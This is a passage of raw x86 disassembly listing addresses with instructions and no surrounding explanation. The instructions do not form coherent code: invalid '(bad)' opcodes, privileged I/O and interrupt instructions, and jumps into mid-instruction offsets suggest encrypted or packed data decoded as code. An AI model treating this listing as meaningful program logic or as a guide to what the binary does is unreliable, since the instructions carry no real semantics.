  4021fe:	xor    ch,BYTE PTR [edx]
  402200:	loope  0x4021fb
  402202:	cmp    esi,0xb74b6819
  402208:	ror    DWORD PTR [ecx],0x86
  40220b:	test   eax,0xb2fc6125
  402210:	jb     0x402234
  402212:	lods   eax,DWORD PTR ds:[esi]
  402213:	jb     0x4021db
  402215:	mov    ebx,0xc2243e98
  40221a:	mov    eax,0x66adb054
  40221f:	sub    DWORD PTR [ebx-0x4c],0xe5e55808
  402226:	mov    al,0x9d
  402228:	int    0x45
  40222a:	cmp    DWORD PTR [edx+esi*8],0x2a
  40222e:	js     0x4021f6
  402230:	jp     0x4021d4
  402232:	jg     0x40226e
  402234:	sub    BYTE PTR [ecx-0x23],cl
  402237:	adc    DWORD PTR ds:0xfca1729c,0x53
  40223e:	mov    ah,BYTE PTR [ebx+0x47]
  402241:	iret   
  402242:	pop    ds
  402243:	pop    es
  402244:	and    eax,DWORD PTR [edi-0x76e197ef]
  40224a:	mov    al,ds:0xee2c0ce3
  40224f:	outs   dx,BYTE PTR ds:[esi]
  402250:	fwait
  402251:	es mov edi,0x90a60d17
  402257:	lock or eax,0xcda3cd4d
  40225d:	dec    ecx
  40225e:	add    BYTE PTR [eax+0x57],ah
  402261:	das    
  402262:	test   eax,0xa1c32a65
  402267:	mov    eax,ds:0x38f4718c
  40226c:	fnstsw WORD PTR cs:0x92b505f3
  402273:	sub    BYTE PTR [ecx],bh
  402275:	push   ecx
  402276:	into   
  402277:	and    al,0x7c
  402279:	mov    al,0x85
  40227b:	lds    eax,FWORD PTR [eax+edx*2+0x4756f5f5]
  402282:	pop    es
  402283:	mov    bh,BYTE PTR [edx]
  402285:	repnz fld TBYTE PTR ds:0x908f55cb
  40228c:	inc    ecx
  40228d:	arpl   bp,ax
  40228f:	sbb    ecx,DWORD PTR [ebx]
  402291:	ficom  DWORD PTR [esp+eiz*4]
  402294:	ins    BYTE PTR es:[edi],dx
  402295:	(bad)  
  402296:	jb     0x402275
  402298:	retf   0xc2ba
  40229b:	mov    ch,0xb0
  40229d:	in     eax,dx
  40229e:	inc    edx
  40229f:	mov    ch,0x2a
  4022a1:	pop    es
  4022a2:	adc    dh,0xd
  4022a5:	adc    esi,DWORD PTR [ebx+0x3e]
  4022a8:	inc    edi
  4022a9:	xchg   edx,eax
  4022aa:	jl     0x4022d5
  4022ac:	mov    ebx,DWORD PTR [edi-0x3cc7295e]
  4022b2:	test   al,ch
  4022b4:	pop    eax
  4022b5:	imul   edi,DWORD PTR [edi],0x788b6666
  4022bb:	add    cl,ah
  4022bd:	sub    BYTE PTR [ebp+0x7],ch
  4022c0:	ret    0x58d0
  4022c3:	inc    esi
  4022c4:	retf   
  4022c5:	cmp    eax,0x4142ac5b
  4022ca:	xchg   ecx,eax
  4022cb:	fcom   DWORD PTR [edx-0x4e844c8d]
  4022d1:	push   ecx
  4022d2:	aaa    
  4022d3:	jnp    0x4022a2
  4022d5:	mov    esi,0xc9f806bb
  4022da:	pop    esp
  4022db:	call   0x6bd3:0xc4e824d7
  4022e2:	scas   eax,DWORD PTR es:[edi]
  4022e3:	mov    cl,0xe1
  4022e5:	ds xchg esp,eax
  4022e7:	int3   
  4022e8:	clc    
  4022e9:	stos   DWORD PTR es:[edi],eax
  4022ea:	xchg   edx,eax
  4022eb:	mov    ebx,0x5438444f
  4022f0:	push   ecx
  4022f1:	xchg   esp,eax
  4022f2:	ins    DWORD PTR es:[edi],dx
  4022f3:	jl     0x40228a
  4022f5:	sub    esi,DWORD PTR [ecx-0x39a7d415]
  4022fb:	pop    ds
  4022fc:	xchg   DWORD PTR [ebp+esi*4-0x63639464],edx
  402303:	mov    ch,0x92
  402305:	test   BYTE PTR [edi+0x3de3f7be],0x5c
  40230c:	fnsave [edx-0x7ef87f3]
  402312:	sar    ebx,0x86
  402315:	lods   al,BYTE PTR ds:[esi]
  402316:	and    eax,0x53e5a1e1
  40231b:	pop    edi
  40231c:	xor    al,0xa3
  40231e:	push   0x29cd511d
  402323:	daa    
  402324:	mov    ebp,0xba99fe7d
  402329:	or     dh,ch
  40232b:	mov    cl,0x74
  40232d:	dec    edx
  40232e:	pop    edx
  40232f:	pop    edx
  402330:	sbb    DWORD PTR [esi],esi
  402332:	push   edi
  402333:	lea    ebp,[esi-0x4e40b6b3]
  402339:	inc    eax
  40233a:	add    bh,al
  40233c:	test   DWORD PTR [eax+ebx*1],0xc007c9a4
  402343:	test   eax,0xb971864f
  402348:	test   al,0x22
  40234a:	popaw  
  40234c:	cmp    BYTE PTR [ebx],0xed
  40234f:	add    edx,DWORD PTR [esi]
  402351:	add    esp,DWORD PTR ds:0xc6a8a6b8
  402357:	outs   dx,BYTE PTR ds:[esi]
  402358:	mov    ecx,0x83800f09
  40235d:	inc    ebp
  40235e:	sub    DWORD PTR [eax-0x5b9e2c43],0xcfbe2df8
  402368:	outs   dx,DWORD PTR ds:[esi]
  402369:	sbb    eax,0x651ae7e6
  40236e:	pop    ecx
  40236f:	cwde   
  402370:	push   0x78e84efb
  402375:	lahf   
  402376:	out    0x14,eax
  402378:	jp     0x4023f8
  40237a:	push   edx
  40237b:	push   es
  40237c:	jbe    0x40232f
  40237e:	push   0x16
  402380:	scas   al,BYTE PTR es:[edi]
  402381:	push   eax
  402382:	loope  0x4023c1
  402384:	popf   
  402385:	xchg   DWORD PTR [edi-0x2e],eax
  402388:	fld    TBYTE PTR [edi-0x44]
  40238b:	mov    bl,0x85
  40238d:	jmp    0x402368
  40238f:	out    0xad,eax
  402391:	into   
  402392:	idiv   edx
  402394:	sub    ch,dh
  402396:	scas   eax,DWORD PTR es:[edi]
  402397:	fs and al,0xe9
  40239a:	shl    BYTE PTR [ebp+0x4f],cl
  40239d:	in     eax,0xbe
  40239f:	shl    ebp,cl
  4023a1:	es pusha 
  4023a3:	dec    ecx
  4023a4:	mov    dl,BYTE PTR fs:[esi]
  4023a7:	pop    esp
  4023a8:	push   eax
  4023a9:	fisubr WORD PTR [edi-0x7e978616]
  4023af:	ds pop esp
  4023b1:	add    bh,bl
  4023b3:	icebp  
  4023b4:	mov    ebp,0xc6b20cdb
  4023b9:	or     DWORD PTR [edi+0x7e1af7a7],edx
  4023bf:	lods   al,BYTE PTR ds:[esi]
  4023c0:	jg     0x4023bd
  4023c2:	sub    ebx,DWORD PTR [edx-0x20]
  4023c5:	js     0x4023de
  4023c7:	aam    0x54
  4023c9:	sti    
  4023ca:	add    al,0xa7
  4023cc:	push   edx
  4023cd:	jp     0x402377
  4023cf:	sbb    al,0x5
  4023d1:	mov    ebp,0x648bacba
  4023d6:	mov    ss,WORD PTR [ebx-0x708ce7fd]
  4023dc:	jecxz  0x40236d
  4023de:	fisub  DWORD PTR [ebx+0x44]
  4023e1:	aam    0xd6
  4023e3:	adc    ecx,DWORD PTR fs:[edx+esi*1+0x7c]
  4023e8:	je     0x4023d2
  4023ea:	shl    BYTE PTR [edi-0x27],cl
  4023ed:	or     DWORD PTR [edi],esp
  4023ef:	fst    st(2)
  4023f1:	imul   ebx,DWORD PTR [edi-0x7],0xffffffec
  4023f5:	pop    edi
  4023f6:	jmp    0x402404
  4023f8:	jne    0x402388
  4023fa:	push   edi
  4023fb:	inc    ecx
  4023fc:	mov    ds:0x50226e07,eax
  402401:	mov    ah,0x57
  402403:	mov    eax,ds:0xf01fba3d
  402408:	fadd   DWORD PTR [ebp-0x4e413c4]
  40240e:	sbb    BYTE PTR [esp+ebp*4-0x47e353d8],bh
  402415:	icebp  
  402416:	jnp    0x40240f
  402418:	(bad)  
  402419:	mov    eax,0xbd3664d6
  40241e:	xchg   ebp,eax
  40241f:	cmp    DWORD PTR [ebx],esp
  402421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402422:	es leave 
  402424:	xor    dl,BYTE PTR [ecx]
  402426:	jg     0x4023ad
  402428:	icebp  
  402429:	mov    esp,0x529cfc54
  40242e:	inc    ecx
  40242f:	dec    esi
  402430:	pop    ecx
  402431:	les    ecx,FWORD PTR [eax+0x3a]
  402434:	(bad)  
  402435:	cmp    DWORD PTR [ecx],ecx
  402437:	fild   WORD PTR [eax-0x45]
  40243a:	and    DWORD PTR [ebp+0x6b4ae66a],eax
  402440:	mov    esi,0x7be3bbc8
  402445:	test   ebx,edx
  402447:	call   FWORD PTR [ebx+edx*1-0xade1f28]
  40244e:	daa    
  40244f:	shr    BYTE PTR [esi],cl
  402451:	mov    bl,0x57
  402453:	fwait
  402454:	sbb    DWORD PTR [ecx],esp
  402456:	xchg   ebp,eax
  402457:	sbb    al,0xac
  402459:	shl    bh,0xdc
  40245c:	jo     0x4024ae
  40245e:	cmp    edi,0xffffffc9
  402461:	clc    
  402462:	mov    edx,0x283bed5c
  402467:	stos   DWORD PTR es:[edi],eax
  402468:	repnz xor al,0x72
  40246b:	leave  
  40246c:	clc    
  40246d:	sub    edi,DWORD PTR [ecx]
  40246f:	push   eax
  402470:	fadd   QWORD PTR [ecx-0x1d]
  402473:	or     ebp,DWORD PTR [edx+ecx*1]
  402476:	adc    edx,DWORD PTR [edx-0x38]
  402479:	mov    dx,0xfe5c
  40247d:	mov    ah,0xc2
  40247f:	mov    dh,0xe7
  402481:	push   ebp
  402482:	ins    DWORD PTR es:[edi],dx
  402483:	sub    eax,0x94dbbc40
  402488:	int3   
  402489:	fist   DWORD PTR [ebx+0x50]
  40248c:	popf   
  40248d:	or     al,0x5f
  40248f:	xor    BYTE PTR [ebp+eiz*1-0x14e98df8],dl
  402496:	inc    esp
  402497:	icebp  
  402498:	out    0x9f,al
  40249a:	dec    ebp
  40249b:	mov    edx,0x391a57c2
  4024a0:	push   cs
  4024a1:	mov    al,ds:0x372d273b
  4024a6:	sbb    eax,0xbcaea2d6
  4024ab:	scas   eax,DWORD PTR es:[edi]
  4024ac:	adc    DWORD PTR [ecx-0x8],0xffffff80
  4024b0:	cmp    BYTE PTR [ecx-0x1a697789],0x39
  4024b7:	jns    0x40243e
  4024b9:	pop    ds
  4024ba:	jg     0x402471
  4024bc:	pop    ebx
  4024bd:	call   0x4d6d:0x88900627
  4024c4:	ja     0x4024fe
  4024c6:	je     0x4024c3
  4024c8:	adc    ch,bl
  4024ca:	sbb    al,0x39
  4024cc:	lods   al,BYTE PTR ds:[esi]
  4024cd:	add    eax,0xc05a08f4
  4024d2:	dec    esi
  4024d3:	jl     0x4024ab
  4024d5:	cld    
  4024d6:	fnstcw WORD PTR [ecx]
  4024d8:	push   di
  4024da:	xchg   DWORD PTR [ebx+esi*8-0x169bfaf],eax
  4024e1:	lods   al,BYTE PTR ds:[esi]
  4024e2:	ret    
  4024e3:	ja     0x40254e
  4024e5:	out    0x33,al
  4024e7:	nop    DWORD PTR [ebp-0x62]
  4024eb:	mov    esi,0xe032919b
  4024f0:	mov    ds:0x1e47b7eb,al
  4024f5:	mov    bh,bl
  4024f7:	fucomp st(3)
  4024f9:	sub    BYTE PTR [edx-0x66],bl
  4024fc:	rcr    DWORD PTR [edx-0x31],cl
  4024ff:	push   edx
  402500:	int3   
  402501:	sub    bh,ch
  402503:	xchg   edx,eax
  402504:	popa   
  402505:	nop
  402506:	rol    DWORD PTR [eax-0x7e],cl
  402509:	jmp    0x4024d4
  40250b:	pop    edi
  40250c:	(bad)  
  40250d:	in     al,0x2d
  40250f:	push   ss
  402510:	xchg   ebp,eax
  402511:	fisttp WORD PTR [ebx+0x6c8d3cdb]
  402517:	pop    edx
  402518:	mov    ds:0x9dcfda12,al
  40251d:	push   edi
  40251e:	fiadd  DWORD PTR [edi-0x1a447cfd]
  402524:	stos   DWORD PTR es:[edi],eax
  402525:	or     eax,0x32e6af21
  40252a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40252b:	mov    ecx,0xb16afb4d
  402530:	hlt    
  402531:	icebp  
  402532:	shl    edi,cl
  402534:	jae    0x402515
  402536:	lea    eax,[ebp-0x2]
  402539:	fwait
  40253a:	mov    dh,0x3c
  40253c:	clc    
  40253d:	lea    ecx,[eax+0x27]
  402540:	mov    dl,0x68
  402542:	nop
  402543:	xchg   esi,eax
  402544:	xchg   ebp,eax
  402545:	icebp  
  402546:	jl     0x4024d9
  402548:	pop    ebp
  402549:	aad    0x2f
  40254b:	in     eax,dx
  40254c:	leave  
  40254d:	icebp  
  40254e:	nop
  40254f:	fs ftst 
  402552:	add    al,0x16
  402554:	adc    BYTE PTR [edx-0x70cb4751],ah
  40255a:	push   ecx
  40255b:	pop    edi
  40255c:	pop    ebp
  40255d:	fldcw  WORD PTR [eax-0x32242eb]
  402563:	dec    edx
  402564:	shl    DWORD PTR [edx-0xe],cl
  402567:	jg     0x4024f4
  402569:	ret    0xaa92
  40256c:	test   DWORD PTR [esi-0x16],edx
  40256f:	stc    
  402570:	pop    esp
  402571:	dec    ecx
  402572:	ss loope 0x402592
  402575:	adc    DWORD PTR [edx],eax
  402577:	(bad)  [edx-0x7a]
  40257a:	pop    edx
  40257b:	xor    DWORD PTR es:[eax+edi*4],edx
  40257f:	jg     0x402522
  402581:	xor    dl,dh
  402583:	jg     0x4025ba
  402585:	push   edi
  402586:	push   es
  402587:	aad    0x45
  402589:	sbb    edi,DWORD PTR [edi-0x5b]
  40258c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40258d:	sbb    DWORD PTR [ecx+0x21],eax
  402590:	dec    eax
  402591:	popa   
  402592:	mov    eax,ds:0x5c596604
  402597:	aaa    
  402598:	gs jno 0x40256a
  40259b:	popf   
  40259c:	xchg   esi,eax
  40259d:	pusha  
  40259e:	jg     0x402572
  4025a0:	leave  
  4025a1:	addr16 mov ebp,0x91481b77
  4025a7:	add    DWORD PTR [edi+0x5bf6392d],ebx
  4025ad:	sub    dh,BYTE PTR [esi-0x2c]
  4025b0:	(bad)  
  4025b1:	cmp    ah,BYTE PTR [edx+0x5fe53394]
  4025b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025b8:	cdq    
  4025b9:	mov    dh,0x87
  4025bb:	jmp    0x402617
  4025bd:	pop    ebx
  4025be:	add    eax,0xb2490bab
  4025c3:	pop    ebp
  4025c4:	xor    esi,DWORD PTR [ebx]
  4025c6:	in     al,dx
  4025c7:	lods   al,BYTE PTR ds:[esi]
  4025c8:	call   0x55e32b14
  4025cd:	les    edi,FWORD PTR [ebx]
  4025cf:	mov    ebx,0xa0929b82
  4025d4:	adc    eax,0xe151c693
  4025d9:	push   0xcb8f1752
  4025de:	push   0xffffff92
  4025e0:	sub    ebx,ebp
  4025e2:	xor    edi,ecx
  4025e4:	mov    bl,0x18
  4025e6:	ins    DWORD PTR es:[edi],dx
  4025e7:	in     al,0x6b
  4025e9:	xchg   ebx,eax
  4025ea:	pop    eax
  4025eb:	mov    eax,ds:0x22bd56b
  4025f0:	mov    al,0x66
  4025f2:	das    
  4025f3:	pop    edi
  4025f4:	pushf  
  4025f5:	je     0x4025a7
  4025f7:	add    DWORD PTR [esi],edi
  4025f9:	(bad)  
  4025fa:	push   esp
  4025fb:	fsub   st(6),st
  4025fd:	xchg   ebx,eax
  4025fe:	mov    ebp,ebp
  402600:	mov    edx,0xb639373c
  402605:	ja     0x4025a6
  402607:	iret   
  402608:	mov    dl,0x72
  40260a:	push   cs
  40260b:	mov    ah,0x3b
  40260d:	or     eax,0x52f7e0c5
  402612:	and    DWORD PTR [ecx+0x4406d8fe],ebp
  402618:	test   BYTE PTR [ecx+ecx*4-0x63],cl
  40261c:	add    BYTE PTR [edx],cl
  40261e:	add    bl,BYTE PTR [ebp-0x46]
  402621:	es pusha 
  402623:	inc    edi
  402624:	out    dx,al
  402625:	clc    
  402626:	out    dx,al
  402627:	xor    al,0x13
  402629:	pop    ss
  40262a:	mov    eax,ds:0xefa848ef
  40262f:	and    ah,BYTE PTR [edi+0x2f4d639b]
  402635:	mov    esi,ecx
  402637:	std    
  402638:	arpl   WORD PTR [edi+ecx*1],sp
  40263b:	mov    cs,esp
  40263d:	loop   0x4026a2
  40263f:	cmp    eax,0xa14d995d
  402644:	inc    esi
  402645:	cli    
  402646:	add    al,al
  402648:	xchg   edi,eax
  402649:	mov    eax,0xd358e99e
  40264e:	xor    ebp,DWORD PTR [edi+ecx*1]
  402651:	nop
  402652:	sti    
  402653:	add    eax,0x665f8eb
  402658:	pop    ecx
  402659:	leave  
  40265a:	pop    esi
  40265b:	clc    
  40265c:	mov    esp,0x3d9d576c
  402661:	(bad)  
  402662:	cld    
  402663:	outs   dx,DWORD PTR ds:[esi]
  402664:	xchg   esp,eax
  402665:	mov    ebp,0xbde15e2
  40266a:	add    al,0xe4
  40266c:	jae    0x402642
  40266e:	mov    al,ds:0xf544b0a9
  402673:	(bad)  
  402674:	mov    bl,0xe6
  402676:	std    
  402677:	add    ebp,esp
  402679:	pop    gs
  40267b:	loope  0x4026dd
  40267d:	ret    0x7d18
  402680:	popf   
  402681:	rcl    BYTE PTR [edx+0x4656f50e],cl
  402687:	pop    es
  402688:	and    eax,0xc13c6cfc
  40268d:	mov    ecx,0x69c6b807
  402692:	ss (bad) 
  402695:	out    dx,eax
  402696:	int    0xa6
  402698:	aaa    
  402699:	inc    ecx
  40269a:	test   BYTE PTR [esp+ebx*1-0x4d7972d6],cl
  4026a1:	popf   
  4026a2:	dec    BYTE PTR [edi+0x17]
  4026a5:	jo     0x402723
  4026a7:	cdq    
  4026a8:	fcmove st,st(6)
  4026aa:	aad    0x2a
  4026ac:	add    eax,0x2a93e339
  4026b1:	cmp    DWORD PTR [esi+0x67],ebp
  4026b4:	xlat   BYTE PTR ds:[ebx]
  4026b5:	inc    esi
  4026b6:	pop    eax
  4026b7:	shl    BYTE PTR [ebp-0x51],0x2b
  4026bb:	push   es
  4026bc:	xchg   ebx,eax
  4026bd:	fidiv  DWORD PTR [esi]
  4026bf:	fbld   TBYTE PTR [ebx]
  4026c1:	fldcw  WORD PTR [esi]
  4026c3:	and    dh,ah
  4026c5:	sbb    al,bh
  4026c7:	or     DWORD PTR ds:0xaf3a1d78,esp
  4026cd:	xor    eax,0x540981b7
  4026d2:	dec    esp
  4026d3:	inc    edi
  4026d4:	lods   al,BYTE PTR ds:[esi]
  4026d5:	push   0xffffff98
  4026d7:	jl     0x402664
  4026d9:	or     DWORD PTR ds:0xd3b70b7d,ecx
  4026df:	retf   0x812d
  4026e2:	push   ebp
  4026e3:	xor    eax,0x917cf7b2
  4026e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026e9:	repnz repnz lds esi,FWORD PTR [ebp-0x64]
  4026ee:	sbb    dh,BYTE PTR [ebx+0x2b13d441]
  4026f4:	sbb    DWORD PTR [eax+0x5c],ebx
  4026f7:	adc    BYTE PTR [ebp+0x27],ch
  4026fa:	das    
  4026fb:	or     eax,0xcb52c8ff
  402700:	ins    DWORD PTR es:[edi],dx
  402701:	mov    dh,0xe8
  402703:	or     eax,0x9bcc5219
  402708:	mov    ebp,0xbab0071e
  40270d:	bound  edi,QWORD PTR [eax]
  40270f:	rcr    ebx,0x48
  402712:	and    BYTE PTR [edx+0x29],ah
  402715:	clc    
  402716:	test   eax,0x7db9d055
  40271b:	(bad)  
  40271c:	mov    dh,0x8e
  40271e:	into   
  40271f:	add    edx,DWORD PTR [eax+0x39]
  402722:	not    ch
  402724:	lahf   
  402725:	push   ebx
  402726:	mov    ecx,0x42ae3179
  40272b:	push   es
  40272c:	mov    edi,0xf440b864
  402731:	dec    eax
  402732:	jmp    0x4027a4
  402734:	or     BYTE PTR [eax-0x43],0xac
  402738:	call   0x1b73:0x1054f57b
  40273f:	jno    0x4027aa
  402741:	mov    bl,0x92
  402743:	dec    esp
  402744:	and    al,0x48
  402746:	xchg   ebx,eax
  402747:	or     eax,0x7bfdc4a9
  40274c:	xchg   esp,eax
  40274d:	(bad)  
  40274f:	push   eax
  402750:	loope  0x402775
  402752:	ds (bad) 
  402754:	cmc    
  402755:	inc    edx
  402756:	ja     0x402787
  402758:	add    eax,0x641061c
  40275d:	and    DWORD PTR [esi+0x2f42357a],ebp
  402763:	pusha  
  402764:	dec    ebx
  402765:	ins    BYTE PTR es:[edi],dx
  402766:	mov    cl,0x26
  402768:	in     eax,dx
  402769:	test   BYTE PTR [ebp-0x442e6eea],ch
  40276f:	pop    edi
  402770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402771:	jno    0x4027e3
  402773:	mov    ch,0x94
  402775:	jo     0x40273b
  402777:	mov    edi,0x44a2bdda
  40277c:	test   ecx,ecx
  40277e:	or     DWORD PTR [esi+0x5],ecx
  402781:	div    BYTE PTR [ebx-0x92f0a28]
  402787:	and    DWORD PTR [ebx+0xf],edi
  40278a:	in     eax,dx
  40278b:	imul   ch
  40278d:	inc    esp
  40278e:	adc    esi,DWORD PTR [ebp-0x61]
  402791:	addr16 mov ds:0xae2f,eax
  402795:	sbb    al,BYTE PTR [ebx+eiz*1-0x597286b5]
  40279c:	xchg   cl,bh
  40279e:	sub    eax,ebx
  4027a0:	rcr    DWORD PTR [edx-0x14],0xbc
  4027a4:	fld    QWORD PTR [ebx+ebp*1+0x2707cbd4]
  4027ab:	sub    bh,0x14
  4027ae:	push   0xd1b458e5
  4027b3:	int    0xc4
  4027b5:	js     0x402808
  4027b7:	cld    
  4027b8:	sbb    ah,BYTE PTR [ecx+0x43520ae1]
  4027be:	jge    0x402762
  4027c0:	out    dx,eax
  4027c1:	imul   ebp,DWORD PTR [esi-0x14],0xffffff8b
  4027c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027c6:	jbe    0x40277e
  4027c8:	push   eax
  4027c9:	(bad)  
  4027ca:	icebp  
  4027cb:	ret    
  4027cc:	not    al
  4027ce:	or     edx,DWORD PTR ds:0x1140bb88
  4027d4:	stos   BYTE PTR es:[edi],al
  4027d5:	add    DWORD PTR [ebx+0x37],ebp
  4027d8:	push   cs
  4027d9:	inc    ecx
  4027da:	fistp  DWORD PTR [ebx-0x35]
  4027dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027de:	popa   
  4027df:	xchg   BYTE PTR [ebp-0x1e],dh
  4027e2:	sbb    dl,BYTE PTR ds:0x248d1cbd
  4027e8:	inc    esp
  4027e9:	shl    ebp,1
  4027eb:	pushf  
  4027ec:	into   
  4027ed:	lahf   
  4027ee:	and    DWORD PTR [ebx+edi*1],0x6301271c
  4027f5:	add    DWORD PTR [esi+0x15],eax
  4027f8:	clc    
  4027f9:	xor    eax,0x7cdeb0ca
  4027fe:	mov    bh,0xc7
  402800:	sbb    BYTE PTR [ecx+0x76894e44],0xa4
  402807:	idiv   DWORD PTR [edi-0x7e]
  40280a:	mov    al,ds:0x4f2464ef
  40280f:	cdq    
  402810:	add    dl,BYTE PTR [ebx-0x390f435b]
  402816:	scas   eax,DWORD PTR es:[edi]
  402817:	mov    DWORD PTR [si],edi
  40281a:	inc    edi
  40281b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40281c:	mov    eax,ds:0x9d45295e
  402821:	rcr    ecx,cl
  402823:	jmp    0xdf459c3d
  402828:	or     eax,DWORD PTR [ecx+ebx*8+0x4f14908e]
  40282f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402830:	sbb    dh,BYTE PTR [esi-0x6dfddbb5]
  402836:	mov    ds:0xb3b8a9e7,eax
  40283b:	mov    al,0x35
  40283d:	pop    esi
  40283e:	and    eax,0x45512705
  402843:	mov    esp,0x22fe6d1b
  402848:	adc    DWORD PTR [esi+0xbb76e78],edx
  40284e:	jecxz  0x4028cd
  402850:	fistp  DWORD PTR [ebp-0x789c0093]
  402856:	fld    DWORD PTR [edi-0x59]
  402859:	lods   al,BYTE PTR ds:[esi]
  40285a:	(bad)
  40285d:	data16 icebp 
  40285f:	addr16 sahf 
  402861:	xchg   esi,eax
  402862:	dec    eax
  402863:	cmc    
  402864:	jns    0x4027f8
  402866:	push   edx
  402867:	xor    bl,BYTE PTR [ecx-0x7634d9e0]
  40286d:	out    0x43,al
  40286f:	adc    al,0x32
  402871:	sahf   
  402872:	or     DWORD PTR [edi+0x34],0x1a
  402876:	sti    
  402877:	cmc    
  402878:	xchg   esp,eax
  402879:	clc    
  40287a:	in     eax,dx
  40287b:	xchg   ebp,eax
  40287c:	lahf   
  40287d:	rcr    DWORD PTR [edx+0x57948596],cl
  402883:	and    dh,bh
  402885:	mov    bl,BYTE PTR [esp+esi*8-0x5f3ebd1f]
  40288c:	loop   0x40281c
  40288e:	repnz pop es
  402890:	hlt    
  402891:	imul   DWORD PTR [eax+0x79]
  402894:	ds test eax,0xccd35f83
  40289a:	int3   
  40289b:	ret    
  40289c:	out    dx,eax
  40289d:	and    cl,BYTE PTR [eax+0x64]
  4028a0:	outs   dx,DWORD PTR ds:[esi]
  4028a1:	retf   
  4028a2:	fst    DWORD PTR [ebx+0xea47c14]
  4028a8:	ins    DWORD PTR es:[edi],dx
  4028a9:	mov    ah,0xc3
  4028ab:	jnp    0x402858
  4028ad:	in     al,dx
  4028ae:	inc    ebx
  4028af:	sub    edi,ecx
  4028b1:	in     eax,0xb6
  4028b3:	and    ebp,DWORD PTR [ebp+0x1c0d40e2]
  4028b9:	adc    esp,ebx
  4028bb:	xchg   edi,eax
  4028bc:	mov    edi,0x29a1c948
  4028c1:	out    dx,al
  4028c2:	(bad)  [eax]
  4028c4:	cmp    BYTE PTR [edi+ecx*2-0x25],dh
  4028c8:	pop    ds
  4028c9:	add    al,BYTE PTR [ebx-0x7f]
  4028cc:	imul   edi,DWORD PTR [bp+di],0xad721d9b
  4028d3:	pop    ds
  4028d4:	mov    ecx,?
  4028d6:	mov    edi,0x7ec2ea3e
  4028db:	or     al,dl
  4028dd:	adc    BYTE PTR [edx+ecx*1],ah
  4028e0:	rcl    BYTE PTR ds:[ebx],1
  4028e3:	sbb    eax,0xa5557b30
  4028e8:	lods   eax,DWORD PTR ds:[esi]
  4028e9:	pop    edx
  4028ea:	sbb    ebp,DWORD PTR [esi+0x2f642db5]
  4028f0:	pushf  
  4028f1:	push   esi
  4028f2:	hlt    
  4028f3:	jns    0x4028dd
  4028f5:	mov    ecx,0x932e9e26
  4028fa:	rcr    bh,cl
  4028fc:	imul   ecx,DWORD PTR [ebx],0xd53e4605
  402902:	fstp   DWORD PTR [ebx]
  402904:	cld    
  402905:	pop    esi
  402906:	mov    ah,0x25
  402908:	mov    al,ds:0xaecd4739
  40290d:	add    al,0xe4
  40290f:	ret    
  402910:	out    0x22,eax
  402912:	sub    eax,ebp
  402914:	rcr    DWORD PTR [ebp-0x64],1
  402917:	fs iret 
  402919:	inc    edi
  40291a:	outs   dx,BYTE PTR ds:[esi]
  40291b:	xchg   edi,eax
  40291c:	mov    eax,0x77c71923
  402921:	pop    ss
  402922:	inc    esp
  402923:	jne    0x40292a
  402925:	jl     0x402922
  402927:	pushw  0x3a
  40292a:	xor    al,0x14
  40292c:	sbb    BYTE PTR [edx+edx*4-0x70],dl
  402930:	xor    BYTE PTR [ecx],0xf5
  402933:	xchg   ebp,eax
  402934:	lahf   
  402935:	jno    0x402975
  402937:	ror    DWORD PTR [ebx-0x57fddaca],1
  40293d:	or     al,0x63
  40293f:	jge    0x40296d
  402941:	mov    al,ds:0x29ba2a08
  402946:	fbld   TBYTE PTR [ebp+0xd]
  402949:	sub    BYTE PTR [ecx-0x4e],bl
  40294c:	ins    BYTE PTR es:[edi],dx
  40294d:	rcl    ecx,1
  40294f:	jge    0x4028de
  402951:	arpl   WORD PTR [ebx+edi*1],sp
  402954:	cvtdq2ps xmm1,XMMWORD PTR [edx-0xca3ecf9]
  40295b:	loope  0x40296f
  40295d:	jne    0x40298a
  40295f:	or     bh,ah
  402961:	(bad)  
  402963:	aas    
  402964:	les    esi,FWORD PTR [esi+0x18979aaa]
  40296a:	loopne 0x40293a
  40296c:	jge    0x40296c
  40296e:	sbb    DWORD PTR [edi],eax
  402970:	jp     0x402972
  402972:	add    BYTE PTR ds:[esi],dl
  402975:	pop    esp
  402976:	pop    esi
  402977:	div    BYTE PTR [eax-0x25]
  40297a:	iret   
  40297b:	sbb    eax,0x928d65bc
  402980:	jle    0x402920
  402982:	sbb    al,0x33
  402984:	shl    DWORD PTR [esi-0x42c76cfd],0xe4
  40298b:	push   0xfffffffd
  40298d:	popa   
  40298e:	push   0xffffff86
  402990:	mov    eax,ds:0xb92d7888
  402995:	mov    ecx,0x729a77e1
  40299a:	inc    esp
  40299b:	int    0x8
  40299d:	lea    esp,[ecx-0x1ec11ef8]
  4029a3:	mov    al,ds:0xed3314f
  4029a8:	in     eax,0x3a
  4029aa:	shl    dl,cl
  4029ac:	leave  
  4029ad:	jae    0x402a1b
  4029af:	sti    
  4029b0:	sbb    DWORD PTR [ecx+ebp*1],eax
  4029b3:	repz push ebp
  4029b5:	fst    DWORD PTR ds:0xefe8a383
  4029bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029bc:	xlat   BYTE PTR ds:[ebx]
  4029bd:	mov    ds:0xc47a1c5,al
  4029c2:	mov    ebx,0x9dec0c80
  4029c7:	mov    edi,DWORD PTR [eax+0x75]
  4029ca:	pushf  
  4029cb:	ins    BYTE PTR es:[edi],dx
  4029cc:	outs   dx,DWORD PTR ds:[esi]
  4029cd:	pop    ebp
  4029ce:	lods   eax,DWORD PTR ds:[esi]
  4029cf:	leave  
  4029d0:	loopne 0x402a32
  4029d2:	mov    cl,0x5d
  4029d4:	inc    ebp
  4029d5:	push   0x6b
  4029d7:	lea    edx,[ecx-0x5d]
  4029da:	or     edi,ecx
  4029dc:	imul   edi,DWORD PTR [esi-0x2a449b94],0xffffffaf
  4029e3:	shr    bh,1
  4029e5:	inc    edi
  4029e6:	mov    cl,0xf4
  4029e8:	out    0xa1,al
